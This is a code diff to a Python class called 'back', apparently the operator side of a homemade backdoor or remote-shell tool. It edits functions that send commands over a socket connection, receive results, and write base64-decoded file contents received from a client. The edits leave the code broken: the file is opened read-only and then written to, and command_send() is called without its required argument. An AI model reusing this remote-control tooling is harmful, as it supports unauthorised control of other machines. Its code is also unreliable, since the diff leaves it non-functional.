@@ -18,8 +18,13 @@ class back:
         '''send and reciv data function'''
         self.connected.send(comnd)
 
-    def donwload_data(self, name, contnd):
-        pass
+
+    def donwload_data(self, name, contad):
+        '''write file function'''
+        with open(name, "rb") as ex:
+            ex.write(b64decode(contad).decode())
+            return "[+] Download successfull!"
+
 
     def reciv_data(self):
         '''reciv data for cliend'''
@@ -35,15 +40,14 @@ class back:
     def run(self):
         '''all function run if while True'''
         while True:
-            read_command = input(">>")
-            # if read_command.startswith("downlod"):
             
-           
-            self.command_send(read_command.encode())
             
-            result = self.reciv_data()
-            print(result)
 
+
+
+            self.command_send()
+            result = self.reciv_data()
+            print(result)   
 
 
 
